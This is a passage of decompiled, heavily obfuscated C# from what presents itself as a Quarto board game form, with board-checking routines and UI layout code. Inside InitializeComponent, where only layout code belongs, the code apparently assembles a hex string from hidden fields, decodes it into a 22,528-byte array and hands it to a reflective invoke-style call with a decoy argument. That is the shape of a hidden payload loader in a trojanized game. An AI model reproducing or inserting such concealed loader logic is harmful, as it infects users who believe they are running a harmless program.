					num = num30 ^ ((int)num2 * -2139780878);
					continue;
				}
				case 53u:
				{
					int num17;
					if (mem[num5, 0].Point == mem[num5, 1].Point)
					{
						num = -2009443984;
						num17 = -2009443984;
					}
					else
					{
						num = -2001437557;
						num17 = -2001437557;
					}
					continue;
				}
				case 52u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -1119384661) ^ 0x789C769D;
						continue;
					}
					goto IL_01a0;
				case 51u:
				{
					int num69;
					int num70;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num69 = -2007459558;
						num70 = -2007459558;
					}
					else
					{
						num69 = -84183733;
						num70 = -84183733;
					}
					num = num69 ^ (int)(num2 * 696330077);
					continue;
				}
				case 50u:
				{
					int num63;
					int num64;
					if (mem[num5, 1].Big != mem[num5, 2].Big)
					{
						num63 = 1405949963;
						num64 = 1405949963;
					}
					else
					{
						num63 = 2043132478;
						num64 = 2043132478;
					}
					num = num63 ^ (int)(num2 * 1140192669);
					continue;
				}
				case 49u:
					if (mem[2, num5] != null)
					{
						num = (int)((num2 * 497568884) ^ 0x2B5263C4);
						continue;
					}
					goto IL_01ac;
				case 48u:
				{
					int num55;
					int num56;
					if (mem[num5, 1].Point != mem[num5, 2].Point)
					{
						num55 = -1141688421;
						num56 = -1141688421;
					}
					else
					{
						num55 = -548517566;
						num56 = -548517566;
					}
					num = num55 ^ (int)(num2 * 792493015);
					continue;
				}
				case 46u:
				{
					int num52;
					int num53;
					if (mem[1, num5].Point == mem[2, num5].Point)
					{
						num52 = -307738498;
						num53 = -307738498;
					}
					else
					{
						num52 = -385607861;
						num53 = -385607861;
					}
					num = num52 ^ ((int)num2 * -2134363289);
					continue;
				}
				case 45u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = (int)((num2 * 1934664701) ^ 0x45E5AD92);
						continue;
					}
					goto IL_01a0;
				case 44u:
					if (mem[3, num5] != null)
					{
						num = ((int)num2 * -839098983) ^ -903637292;
						continue;
					}
					goto IL_01ac;
				case 43u:
				{
					int num44;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -593171207;
						num44 = -593171207;
					}
					else
					{
						num = -1694198722;
						num44 = -1694198722;
					}
					continue;
				}
				case 42u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = ((int)num2 * -803198014) ^ 0x6F488F44;
						continue;
					}
					goto IL_01a0;
				case 41u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -915675481) ^ 0x190DF9CB;
						continue;
					}
					goto IL_073c;
				case 40u:
				{
					int num36;
					int num37;
					if (mem[1, 1] == null)
					{
						num36 = 1370375905;
						num37 = 1370375905;
					}
					else
					{
						num36 = 1183130233;
						num37 = 1183130233;
					}
					num = num36 ^ ((int)num2 * -1683902955);
					continue;
				}
				case 39u:
					num5 = 0;
					num = ((int)num2 * -651746779) ^ 0x6B1972C4;
					continue;
				case 38u:
				{
					int num25;
					int num26;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num25 = 1128642331;
						num26 = 1128642331;
					}
					else
					{
						num25 = 674816419;
						num26 = 674816419;
					}
					num = num25 ^ (int)(num2 * 1415564788);
					continue;
				}
				case 37u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = -650756751;
						continue;
					}
					goto IL_01ac;
				case 36u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 220506455) ^ 0x39183F3D);
						continue;
					}
					goto IL_0082;
				case 35u:
					if (mem[2, num5].Square == mem[3, num5].Square)
					{
						goto IL_01a0;
					}
					goto IL_01ac;
				case 34u:
				{
					int num13;
					int num14;
					if (mem[num5, 0] != null)
					{
						num13 = -580958206;
						num14 = -580958206;
					}
					else
					{
						num13 = -248907296;
						num14 = -248907296;
					}
					num = num13 ^ ((int)num2 * -2038519349);
					continue;
				}
				case 33u:
				{
					int num6;
					int num7;
					if (mem[num5, 2] == null)
					{
						num6 = 67219062;
						num7 = 67219062;
					}
					else
					{
						num6 = 1312344445;
						num7 = 1312344445;
					}
					num = num6 ^ ((int)num2 * -1013563096);
					continue;
				}
				case 32u:
				{
					int num67;
					int num68;
					if (mem[0, num5].Big == mem[1, num5].Big)
					{
						num67 = 1095837221;
						num68 = 1095837221;
					}
					else
					{
						num67 = 577132748;
						num68 = 577132748;
					}
					num = num67 ^ ((int)num2 * -1626860939);
					continue;
				}
				case 31u:
				{
					int num62;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = -1307906290;
						num62 = -1307906290;
					}
					else
					{
						num = -199895575;
						num62 = -199895575;
					}
					continue;
				}
				case 30u:
					if (mem[1, num5] != null)
					{
						num = ((int)num2 * -2028356598) ^ 0x4FB80925;
						continue;
					}
					goto IL_01ac;
				case 29u:
					flag = true;
					num = ((int)num2 * -1173033713) ^ -923408703;
					continue;
				case 28u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1513432688) ^ -947410181;
						continue;
					}
					goto IL_0058;
				case 27u:
					num = ((int)num2 * -452339401) ^ 0x7ACF1ECE;
					continue;
				case 26u:
					num = -363034577;
					continue;
				case 25u:
				{
					int num57;
					int num58;
					if (mem[1, num5].Big != mem[2, num5].Big)
					{
						num57 = -248716861;
						num58 = -248716861;
					}
					else
					{
						num57 = -1713225707;
						num58 = -1713225707;
					}
					num = num57 ^ ((int)num2 * -466046197);
					continue;
				}
				case 24u:
				{
					int num54;
					if (mem[0, num5].Dark == mem[1, num5].Dark)
					{
						num = -2071675436;
						num54 = -2071675436;
					}
					else
					{
						num = -759107105;
						num54 = -759107105;
					}
					continue;
				}
				case 23u:
					num = -66302694;
					continue;
				case 22u:
				{
					int num50;
					int num51;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num50 = -177831902;
						num51 = -177831902;
					}
					else
					{
						num50 = -1779189415;
						num51 = -1779189415;
					}
					num = num50 ^ ((int)num2 * -1660416089);
					continue;
				}
				case 21u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -1454064343;
						continue;
					}
					goto IL_073c;
				case 20u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1628528335) ^ -427275049;
						continue;
					}
					goto IL_0287;
				case 19u:
				{
					int num47;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = -620588433;
						num47 = -620588433;
					}
					else
					{
						num = -166150071;
						num47 = -166150071;
					}
					continue;
				}
				case 18u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -2042207834) ^ -1968865974;
						continue;
					}
					goto IL_0082;
				case 17u:
					if (mem[0, 3] != null)
					{
						num = -1480517940;
						continue;
					}
					goto IL_0082;
				case 16u:
				{
					int num41;
					int num42;
					if (mem[num5, 1] != null)
					{
						num41 = 1110432141;
						num42 = 1110432141;
					}
					else
					{
						num41 = 978323166;
						num42 = 978323166;
					}
					num = num41 ^ ((int)num2 * -607173480);
					continue;
				}
				case 15u:
					flag = true;
					num = ((int)num2 * -1556243231) ^ -2084598130;
					continue;
				case 14u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = (int)(num2 * 1888645737) ^ -1243307735;
						continue;
					}
					goto IL_01a0;
				case 13u:
					result = flag;
					num = -1804096625;
					continue;
				case 12u:
					num12 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0059;
				case 10u:
				{
					int num38;
					int num39;
					if (mem[0, 0] != null)
					{
						num38 = -711612914;
						num39 = -711612914;
					}
					else
					{
						num38 = -1398070705;
						num39 = -1398070705;
					}
					num = num38 ^ (int)(num2 * 431813009);
					continue;
				}
				case 9u:
				{
					int num32;
					int num33;
					if (mem[3, 3] == null)
					{
						num32 = 634136546;
						num33 = 634136546;
					}
					else
					{
						num32 = 1610700136;
						num33 = 1610700136;
					}
					num = num32 ^ ((int)num2 * -2051240585);
					continue;
				}
				case 8u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)((num2 * 2144015873) ^ 0x1393A651);
						continue;
					}
					goto IL_0058;
				case 7u:
				{
					int num27;
					int num28;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num27 = 417544900;
						num28 = 417544900;
					}
					else
					{
						num27 = 1164227727;
						num28 = 1164227727;
					}
					num = num27 ^ ((int)num2 * -1443827616);
					continue;
				}
				case 6u:
				{
					int num22;
					int num23;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num22 = 65022103;
						num23 = 65022103;
					}
					else
					{
						num22 = 1946576640;
						num23 = 1946576640;
					}
					num = num22 ^ (int)(num2 * 145207958);
					continue;
				}
				case 5u:
				{
					int num18;
					int num19;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num18 = -2025039360;
						num19 = -2025039360;
					}
					else
					{
						num18 = -1231500138;
						num19 = -1231500138;
					}
					num = num18 ^ (int)(num2 * 281673614);
					continue;
				}
				case 4u:
				{
					int num15;
					int num16;
					if (flag2)
					{
						num15 = 564806971;
						num16 = 564806971;
					}
					else
					{
						num15 = 436171285;
						num16 = 436171285;
					}
					num = num15 ^ (int)(num2 * 114189622);
					continue;
				}
				case 3u:
					num5++;
					num = ((int)num2 * -1115520554) ^ 0x3EC0B2D9;
					continue;
				case 2u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1157659802) ^ -1567486369;
						continue;
					}
					goto IL_0287;
				case 1u:
				{
					int num8;
					int num9;
					if (mem[2, 2] == null)
					{
						num8 = 2084214504;
						num9 = 2084214504;
					}
					else
					{
						num8 = 1196923084;
						num9 = 1196923084;
					}
					num = num8 ^ ((int)num2 * -2078798127);
					continue;
				}
				case 0u:
				{
					int num3;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -518107617;
						num3 = -518107617;
					}
					else
					{
						num = -815517905;
						num3 = -815517905;
					}
					continue;
				}
				case 47u:
					break;
				default:
					{
						return result;
					}
					IL_0058:
					num12 = 1;
					goto IL_0059;
					IL_0082:
					num12 = 0;
					goto IL_0059;
					IL_01a0:
					num = -1541487367;
					num40 = -1541487367;
					continue;
					IL_073c:
					num12 = 0;
					goto IL_0059;
					IL_0287:
					num12 = 1;
					goto IL_0059;
					IL_0059:
					flag2 = (byte)num12 != 0;
					num = -2128502092;
					continue;
					IL_01ac:
					num = -823766186;
					num40 = -823766186;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1398581200;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x65169AC8u) % 16u)
				{
				case 15u:
					num3++;
					num = ((int)num2 * -1317933636) ^ 0x5B36E25B;
					continue;
				case 14u:
					num = ((int)num2 * -1048422772) ^ 0x12FAACB7;
					continue;
				case 13u:
					num4++;
					num = 1236436993;
					continue;
				case 12u:
					num = ((int)num2 * -1589975690) ^ -1650681303;
					continue;
				case 11u:
					flag = false;
					num = (int)(num2 * 1199095603) ^ -17743484;
					continue;
				case 9u:
					flag2 = num4 < 4;
					num = 678531916;
					continue;
				case 8u:
					flag = true;
					num = (int)((num2 * 2094540094) ^ 0x47344FDB);
					continue;
				case 7u:
				{
					int num8;
					if (num3 >= 4)
					{
						num = 342683177;
						num8 = 342683177;
					}
					else
					{
						num = 1614946333;
						num8 = 1614946333;
					}
					continue;
				}
				case 6u:
					num = ((int)num2 * -1835772935) ^ 0x12449514;
					continue;
				case 5u:
					num4 = 0;
					num = 2046665012;
					continue;
				case 4u:
				{
					int num6;
					int num7;
					if (flag2)
					{
						num6 = 2067358898;
						num7 = 2067358898;
					}
					else
					{
						num6 = 1005974383;
						num7 = 1005974383;
					}
					num = num6 ^ (int)(num2 * 1153212558);
					continue;
				}
				case 3u:
					num3 = 0;
					num = ((int)num2 * -1320202683) ^ -618987159;
					continue;
				case 2u:
				{
					int num5;
					if (mem[num3, num4] != null)
					{
						num = 1873385717;
						num5 = 1873385717;
					}
					else
					{
						num = 430394883;
						num5 = 430394883;
					}
					continue;
				}
				case 1u:
					result = flag;
					num = ((int)num2 * -1269254844) ^ 0x4B2D252A;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 143716456;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x54ECC135u) % 9u)
				{
				case 8u:
					num = ((int)num2 * -1466434302) ^ -352123557;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = (int)(num2 * 1982295818) ^ -1287708862;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)(num2 * 1078729447) ^ -1172059000;
					continue;
				case 4u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -764181759) ^ 0x4DCDC41E;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 661087803) ^ 0x3A65F861);
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -1858936918) ^ 0x151FA16D;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)((num2 * 9151791) ^ 0x206017C);
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1972459442;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0xFF4A6EE7u) % 9u)
				{
				case 8u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 955548624;
						num5 = 955548624;
					}
					else
					{
						num4 = 1018905261;
						num5 = 1018905261;
					}
					num = num4 ^ (int)(num2 * 1071379565);
					continue;
				}
				case 7u:
					if (disposing)
					{
						num = (int)(num2 * 1481193949) ^ -1674459921;
						continue;
					}
					num3 = 0;
					goto IL_003d;
				case 6u:
					((Form)this).Dispose(disposing);
					num = -803500491;
					continue;
				case 4u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -1108006833) ^ 0x3140C1B9;
					continue;
				case 3u:
					num3 = ((components != null) ? 1 : 0);
					goto IL_003d;
				case 1u:
					num = (int)(num2 * 1337325937) ^ -644287374;
					continue;
				case 0u:
					num = (int)(num2 * 1476368215) ^ -2143046788;
					continue;
				default:
					return;
				case 5u:
					break;
				case 2u:
					return;
					IL_003d:
					flag = (byte)num3 != 0;
					num = -1743408768;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0d87: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d91: Expected O, but got Unknown
		byte[] array = default(byte[]);
		int num3 = default(int);
		object[] object_ = default(object[]);
		string sa = default(string);
		bool flag = default(bool);
		while (true)
		{
			int num = 931115680;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x459BE48Cu) % 139u)
				{
				case 138u:
					num = (int)((num2 * 634294500) ^ 0x66A460E0);
					continue;
				case 137u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)(num2 * 1902824547) ^ -1665936642;
					continue;
				case 136u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -1098508563) ^ 0x22816A82;
					continue;
				case 135u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -36244687) ^ -400384754;
					continue;
				case 134u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 583834977) ^ 0x115CF335);
					continue;
				case 133u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)(num2 * 1890123841) ^ -1852500439;
					continue;
				case 132u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					Form1.smethod_5((Control)(object)this, Color.White);
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)((num2 * 1460034282) ^ 0x2A5C47B5);
					continue;
				case 131u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -1252274223) ^ -72502041;
					continue;
				case 130u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1557798075) ^ -1221027067;
					continue;
				case 129u:
					num = ((int)num2 * -1746558651) ^ 0x302984A;
					continue;
				case 128u:
					num = ((int)num2 * -895663166) ^ -1942761258;
					continue;
				case 127u:
					num = (int)((num2 * 2034374531) ^ 0x9D1CD04);
					continue;
				case 126u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 148214620) ^ -2098122596;
					continue;
				case 125u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -775427961) ^ 0x6CDA5D51;
					continue;
				case 124u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -926798839) ^ 0x71F9E3C7;
					continue;
				case 123u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)((num2 * 1618206060) ^ 0xD2D47C6);
					continue;
				case 122u:
					Form1.smethod_64((Control)(object)label2, 9);
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)((num2 * 1941515635) ^ 0xBA731F0);
					continue;
				case 121u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -82053764) ^ -1667037127;
					continue;
				case 120u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(sa, num3 * 2, 2), 16);
					num = ((int)num2 * -1259917171) ^ -1687289221;
					continue;
				case 119u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)(num2 * 386562426) ^ -663178564;
					continue;
				case 118u:
					num = ((int)num2 * -506293934) ^ 0x1775F168;
					continue;
				case 116u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 825961824) ^ -1599680126;
					continue;
				case 115u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -30730470) ^ -1272031236;
					continue;
				case 114u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = (int)((num2 * 239602972) ^ 0x6C28648);
					continue;
				case 113u:
					num = ((int)num2 * -777709227) ^ 0xBB15F23;
					continue;
				case 112u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -101773171) ^ -737759387;
					continue;
				case 111u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 170895705) ^ -1173769640;
					continue;
				case 110u:
					num = (int)(num2 * 480089414) ^ -2083949570;
					continue;
				case 109u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1608108439) ^ -385417823;
					continue;
				case 108u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)(num2 * 1532131308) ^ -439077272;
					continue;
				case 107u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 1726343329) ^ 0x696BD043);
					continue;
				case 106u:
					num = (int)(num2 * 1681587493) ^ -1644893693;
					continue;
				case 105u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 136838413) ^ 0x19F259CF);
					continue;
				case 104u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -99647781) ^ 0x67747483;
					continue;
				case 103u:
					sa = Veet.Sa;
					sa = Form1.smethod_34(sa, Veet.Xe);
					sa = Form1.smethod_34(sa, Veet.Zr);
					array = new byte[22528];
					num = (int)((num2 * 1060429453) ^ 0x3E4954C9);
					continue;
				case 102u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 1902848587) ^ -2011660997;
					continue;
				case 101u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -1922771744) ^ 0x11AB79D9;
					continue;
				case 100u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1275461860) ^ 0x619053E2;
					continue;
				case 99u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					button2 = Form1.smethod_53();
					num = ((int)num2 * -1943495363) ^ -802346637;
					continue;
				case 98u:
					num = 1038999973;
					continue;
				case 97u:
					timer1 = Form1.smethod_56(components);
					num = (int)((num2 * 1692659127) ^ 0x7E417F5D);
					continue;
				case 96u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 796003916) ^ -348438273;
					continue;
				case 95u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -296093352) ^ 0x36C48E0A;
					continue;
				case 94u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1402238992) ^ -165042958;
					continue;
				case 93u:
					num = (int)((num2 * 1470219994) ^ 0x32A8817A);
					continue;
				case 92u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -848309790) ^ 0x43F63E99;
					continue;
				case 91u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 1045906185) ^ 0x5FCAE342);
					continue;
				case 90u:
					num = ((int)num2 * -836807553) ^ 0x79D280B1;
					continue;
				case 89u:
					Form1.smethod_70(ComMember, object_);
					num = (int)((num2 * 166912919) ^ 0x6D48C3F2);
					continue;
				case 88u:
					num = (int)(num2 * 1347454081) ^ -11820507;
					continue;
				case 87u:
					num = ((int)num2 * -1692485485) ^ -583051930;
					continue;
				case 86u:
					num = ((int)num2 * -1631654773) ^ -1472507144;
					continue;
				case 85u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -817960780) ^ -1731291277;
					continue;
				case 84u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 416931218) ^ -1930758787;
					continue;
				case 83u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1317600823) ^ -618546512;
					continue;
				case 82u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -2031414701) ^ 0x62E2BE64;
					continue;
				case 81u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)((num2 * 2135285377) ^ 0x26045F3F);
					continue;
				case 80u:
					num = (int)(num2 * 1875227964) ^ -349306956;
					continue;
				case 79u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -2025142728) ^ -96442628;
					continue;
				case 78u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -1108116124) ^ -935753992;
					continue;
				case 77u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 1443444043;
						num5 = 1443444043;
					}
					else
					{
						num4 = 547319974;
						num5 = 547319974;
					}
					num = num4 ^ (int)(num2 * 710519499);
					continue;
				}
				case 76u:
					num = ((int)num2 * -1287107507) ^ 0x5E77E519;
					continue;
				case 75u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -581634840) ^ 0x44AFBCE0;
					continue;
				case 74u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -486759971) ^ -1664577820;
					continue;
				case 73u:
					num = (int)(num2 * 202821574) ^ -1133475457;
					continue;
				case 72u:
					num = ((int)num2 * -1324381082) ^ -775711281;
					continue;
				case 71u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)((num2 * 82470259) ^ 0x7F9B8000);
					continue;
				case 70u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1832829403) ^ 0xA7C4129;
					continue;
				case 69u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 190731084) ^ -258240178;
					continue;
				case 68u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 1720592877) ^ 0xCD8CA8D);
					continue;
				case 67u:
					num = ((int)num2 * -896524817) ^ -500614889;
					continue;
				case 66u:
					flag = num3 < 22528;
					num = 1186698449;
					continue;
				case 65u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 1902356949) ^ -555613095;
					continue;
				case 64u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)((num2 * 451303884) ^ 0x3212A13F);
					continue;
				case 63u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)(num2 * 625499532) ^ -1382353323;
					continue;
				case 62u:
					num = ((int)num2 * -2136746884) ^ 0x32B1370;
					continue;
				case 61u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1314460311) ^ 0x3A9986AE;
					continue;
				case 60u:
					num = ((int)num2 * -294386157) ^ 0x43370723;
					continue;
				case 59u:
					num = ((int)num2 * -2097716555) ^ 0x54B19456;
					continue;
				case 58u:
					num = ((int)num2 * -1107294706) ^ -102988539;
					continue;
				case 57u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -270492790) ^ -2076629387;
					continue;
				case 56u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -2046053137) ^ 0x6DE0D144;
					continue;
				case 55u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -2074652724) ^ 0x241FF73D;
					continue;
				case 54u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -351008703) ^ -1238764895;
					continue;
				case 53u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 2143181205) ^ 0x271BE712);
					continue;
				case 52u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)(num2 * 1248790899) ^ -1568857543;
					continue;
				case 51u:
					num = ((int)num2 * -971275601) ^ -1275437726;
					continue;
				case 50u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -548963992) ^ -760666180;
					continue;
				case 49u:
					num = ((int)num2 * -248881761) ^ 0x3001FBDE;
					continue;
				case 48u:
					num3 = 0;
					num = (int)((num2 * 1498464797) ^ 0x3BDE3E65);
					continue;
				case 47u:
					num = ((int)num2 * -70861442) ^ -1981876056;
					continue;
				case 46u:
					num3++;
					num = ((int)num2 * -606750689) ^ -1357046944;
					continue;
				case 45u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1421905762) ^ -396601393;
					continue;
				case 44u:
					num = ((int)num2 * -1800874543) ^ 0x1E570AB7;
					continue;
				case 43u:
					num = ((int)num2 * -792719703) ^ -736914654;
					continue;
				case 42u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)(num2 * 502880925) ^ -1289951498;
					continue;
				case 41u:
					num = (int)(num2 * 306443508) ^ -1499291634;
					continue;
				case 40u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -177091503) ^ 0x5896FDDF;
					continue;
				case 39u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -715267249) ^ 0x517E08E4;
					continue;
				case 38u:
					num = ((int)num2 * -768583574) ^ 0x74A5C7DB;
					continue;
				case 37u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -1975895956) ^ 0x35B42A79;
					continue;
				case 36u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -121059429) ^ 0x1061FBD4;
					continue;
				case 35u:
					Form1.smethod_72(timer1, 1000);
					num = (int)((num2 * 2100428020) ^ 0x2D7D299F);
					continue;
				case 34u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 388323727) ^ 0x67B68A4A);
					continue;
				case 33u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -1709378993) ^ -518035003;
					continue;
				case 32u:
					num = (int)((num2 * 1872448481) ^ 0x76CDD7A4);
					continue;
				case 30u:
					num = ((int)num2 * -28910724) ^ -339347694;
					continue;
				case 29u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 1117869346) ^ 0x23575A2F);
					continue;
				case 28u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)(num2 * 653591692) ^ -91107967;
					continue;
				case 27u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -1005159230) ^ 0x6B8128E0;
					continue;
				case 26u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -958691951) ^ -1297982788;
					continue;
				case 25u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -984296104) ^ 0x5CCF944A;
					continue;
				case 24u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1111606766) ^ 0x213B6B4;
					continue;
				case 23u:
